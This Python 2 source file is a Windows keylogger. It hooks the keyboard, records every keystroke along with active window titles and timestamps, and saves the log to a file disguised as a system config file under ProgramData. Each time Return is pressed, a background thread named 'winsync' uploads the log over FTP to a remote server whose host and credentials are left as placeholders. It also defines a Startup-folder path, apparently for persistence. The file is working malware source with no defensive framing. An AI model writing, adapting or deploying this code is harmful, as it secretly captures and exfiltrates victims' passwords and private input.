import pythoncom
import pyHook
import time
import ftplib
import threading
import os

PATHS = {'PROGRAM_DATA': os.environ.get('PROGRAMDATA'),
        'USER_NAME': os.environ.get('USERNAME'),
        'STARTUP_PATH': os.environ.get('APPDATA')+'\Microsoft\Windows\Start Menu\Programs\Startup\\',
        'UPLOAD_FILE': os.environ.get('USERNAME').lower()+'.dat',
        'RECORD_FILE': os.environ.get('PROGRAMDATA') + '\Windows\\build\\config.dat'}

CTRL_KEYS = ('Lshift','Lcontrol', 'Lwin', 'Lmenu', 'Capital',
             'Rmenu', 'Apps', 'Rcontrol', 'Rshift', 'Numlock')
FN_KEYS = ('Tab', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8',
           'F9', 'F10', 'F11', 'F12', 'Snapshot', 'Insert', 'Delete',
           'Home', 'End', 'Prior', 'Next', 'Up', 'Down', 'Left',
           'Right', 'Clear', 'Escape')


def sync():
    print 'Starting upload...'
    ftp = ftplib.FTP('-host-', '-user0name-', '-password-')
    ftp.cwd('metadata')
    ftp.storbinary('STOR '+PATHS.get('UPLOAD_FILE'), open(PATHS.get('RECORD_FILE'), 'rb'))
    ftp.quit()
    print 'Upload completed...'


def flushtofile(buff):
    f=open(PATHS.get('RECORD_FILE'), 'a')
    f.write(buff)
    f.close()


def syncinbg():
    bgproc = threading.Thread(target=sync, name='winsync')
    print 'starting thread'
    bgproc.start()
    # bgproc.join()


def onkeydown(event):
    global lBuffer
    global windowName
    global lastEventTime

    timeNow = time.time()
    key = event.Key
    
    if (timeNow-lastEventTime >= 30) & (key != 'Back'):
        flushtofile(lBuffer)
        # syncinbg()
        lBuffer = ""
        lastEventTime = timeNow

    if(event.WindowName != windowName) & (event.WindowName is not None):
        lBuffer += '\n\n------  ' + event.WindowName + '  ------\n'\
                   + time.asctime(time.localtime(time.time()))+'\n\n'
        windowName = event.WindowName

    if key in CTRL_KEYS:
        pass
    elif key == 'Back':
        lBuffer=lBuffer[:-1]
    elif key == 'Return':
        lBuffer += '\n'
        flushtofile(lBuffer)
        syncinbg()
        lBuffer = ""
    elif key in FN_KEYS:
        lBuffer += '[ -('+key+')- ]'
    else:
        lBuffer += chr(event.Ascii)
    return True


if __name__ == '__main__':
    lBuffer = ""
    windowName = ""
    lastEventTime = time.time()

    hM = pyHook.HookManager()
    hM.SubscribeKeyDown(onkeydown)
    hM.HookKeyboard()
    pythoncom.PumpMessages()
